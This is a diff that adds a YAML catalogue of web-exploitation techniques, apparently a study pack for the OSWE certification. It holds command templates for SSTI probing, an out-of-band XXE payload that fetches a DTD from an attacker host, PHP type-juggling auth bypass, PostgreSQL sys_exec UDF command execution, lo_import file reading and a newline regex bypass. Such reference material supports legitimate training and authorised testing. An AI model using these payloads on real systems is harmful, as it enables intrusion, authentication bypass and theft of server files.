@@ -1,0 +1,158 @@
+sections:
+  - id: oswe.webx
+    title: 'OSWE — Web exploitation II'
+    os: linux
+    order: 302
+    techniques:
+      [
+        oswe.ssti,
+        oswe.xxe,
+        oswe.php.typejuggle,
+        oswe.php.magichash,
+        oswe.pgsql.udf,
+        oswe.pgsql.largeobject,
+        oswe.bypass.regex,
+      ]
+    packs: [oswe]
+techniques:
+  - id: oswe.ssti
+    title: 'Server-side template injection'
+    os: [linux]
+    phase: web
+    summary: 'Detect the engine with an arithmetic probe, then escalate to RCE per engine.'
+    commands: [oswe.ssti.probe]
+    tags: [web, ssti, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+  - id: oswe.xxe
+    title: 'XXE (out-of-band)'
+    os: [linux]
+    phase: web
+    summary: 'Declare an external entity that fetches your DTD to exfiltrate via OOB.'
+    commands: [oswe.xxe.oob]
+    tags: [web, xxe, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+  - id: oswe.php.typejuggle
+    title: 'PHP type juggling'
+    os: [linux]
+    phase: web
+    summary: 'Abuse loose == / array comparison to bypass an auth check.'
+    commands: [oswe.php.typejuggle.array]
+    tags: [web, php, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+  - id: oswe.php.magichash
+    title: 'PHP magic hashes'
+    os: [linux]
+    phase: web
+    summary: 'A value whose hash is a 0e-prefixed scientific-notation zero passes a loose == (value-specific, unverified).'
+    commands: [oswe.php.magichash.probe]
+    tags: [web, php, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: unverified
+    packs: [oswe]
+  - id: oswe.pgsql.udf
+    title: 'PostgreSQL extensions & UDFs'
+    os: [linux]
+    phase: exploitation
+    summary: 'Register a C UDF from a shared object to reach OS command execution.'
+    commands: [oswe.pgsql.udf.create]
+    tags: [web, postgres, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+  - id: oswe.pgsql.largeobject
+    title: 'PostgreSQL large objects'
+    os: [linux]
+    phase: exploitation
+    summary: 'Read/write server files via lo_import / lo_export.'
+    commands: [oswe.pgsql.largeobject.import]
+    tags: [web, postgres, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+  - id: oswe.bypass.regex
+    title: 'REGEX-restriction bypass'
+    os: [linux]
+    phase: web
+    summary: 'A newline slips past a single-line ^…$ anchored validator.'
+    commands: [oswe.bypass.regex.newline]
+    tags: [web, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+commands:
+  - id: oswe.ssti.probe
+    title: 'SSTI engine-detection probe'
+    template: 'curl -s -G "{{URL}}" --data-urlencode "q=${7*7}"'
+    shell: bash
+    os: [linux]
+    tags: [ssti]
+    danger: medium
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
+  - id: oswe.xxe.oob
+    title: 'OOB XXE payload'
+    template: '<!DOCTYPE r [<!ENTITY % x SYSTEM "http://{{LHOST}}/x.dtd">%x;]>'
+    shell: text
+    os: [linux]
+    tags: [xxe]
+    danger: high
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
+  - id: oswe.php.typejuggle.array
+    title: 'Array type-juggle auth bypass'
+    template: 'curl -s "{{URL}}" -d "user[]=1&hash[]=2"'
+    shell: bash
+    os: [linux]
+    tags: [php]
+    danger: high
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
+  - id: oswe.php.magichash.probe
+    title: 'Magic-hash loose-comparison probe'
+    template: 'curl -s "{{URL}}" -d "p={{PAYLOAD}}"'
+    shell: bash
+    os: [linux]
+    tags: [php]
+    danger: medium
+    confidence: unverified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
+  - id: oswe.pgsql.udf.create
+    title: 'CREATE FUNCTION sys_exec'
+    template: 'CREATE FUNCTION sys_exec(text) RETURNS int AS ''{{SO_PATH}}'',''sys_exec'' LANGUAGE c;'
+    shell: sql
+    os: [linux]
+    tags: [postgres]
+    danger: critical
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
+  - id: oswe.pgsql.largeobject.import
+    title: 'lo_import server file read'
+    template: 'SELECT lo_import(''{{REMOTE_FILE}}'', {{OID}});'
+    shell: sql
+    os: [linux]
+    tags: [postgres]
+    danger: medium
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
+  - id: oswe.bypass.regex.newline
+    title: 'Newline regex bypass'
+    template: 'admin\ninjected'
+    shell: text
+    os: [linux]
+    tags: [web]
+    danger: medium
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
